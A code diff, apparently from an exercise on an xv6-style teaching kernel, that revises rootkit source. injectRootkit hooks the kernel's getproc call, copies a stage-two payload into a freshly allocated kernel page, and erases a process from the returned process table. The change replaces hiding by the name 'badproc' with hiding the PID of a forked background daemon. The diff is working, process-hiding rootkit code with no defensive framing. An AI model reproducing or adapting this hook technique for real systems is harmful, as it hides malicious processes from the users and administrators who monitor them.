@@ -3,35 +3,28 @@
 #include "proc.h"
 
 int (*oldGetproc)(void*);
+int daemonPid;
 
 int exploitStage2() {
     int eip = 0;
     int retval;
     int (*realGetproc)(void);
+    int hiddenPid;
     struct proctable *myptable;
     int i;
     /* int tmp; */
 
     // Grab our eip from eax
     asm("mov %%eax, %0" : "=r" (eip));
-    realGetproc = (int(*)(void)) (*(int*)(eip - sizeof(int)));
+    realGetproc = (int(*)(void)) (*(int*)(eip - sizeof(int) * 2));
+    hiddenPid = *(int*)(eip - sizeof(int));
     retval = realGetproc();
 
     myptable = *(struct proctable **)(proc->tf->esp + 4);
 
     for (i = 0; i < NPROC; ++i)
     {
-        // This is stupid...
-        if (
-            myptable->proc[i].name[0] == 'b' &&
-            myptable->proc[i].name[1] == 'a' &&
-            myptable->proc[i].name[2] == 'd' &&
-            myptable->proc[i].name[3] == 'p' &&
-            myptable->proc[i].name[4] == 'r' &&
-            myptable->proc[i].name[5] == 'o' &&
-            myptable->proc[i].name[6] == 'c' &&
-            myptable->proc[i].name[7] == '\0'
-        )
+        if (myptable->proc[i].pid == hiddenPid)
         {
             myptable->proc[i].state = UNUSED;
             myptable->proc[i].pid = 0;
@@ -47,11 +40,12 @@ void* exploitStage1() {
 
     kalloc = (int*(*)())findkalloc();
     newpage = kalloc();
-    *newpage = (int)oldGetproc;
+    newpage[0] = (int)oldGetproc;
+    newpage[1] = daemonPid;
 
-    memmove(&newpage[1], &exploitStage2, 1024);
+    memmove(&newpage[2], &exploitStage2, 1024);
 
-    return &newpage[1];
+    return &newpage[2];
 }
 
 void injectRootkit() {
@@ -64,14 +58,13 @@ void injectRootkit() {
 
 int main(int argc, char *argv[])
 {
-    int pid;
     int output;
     int curruptime;
 
-    injectRootkit();
-
-    if ((pid = fork()) > 0)
+    if ((daemonPid = fork()) > 0) {
+        injectRootkit();
         exit();
+    }
 
     while(1)
     {
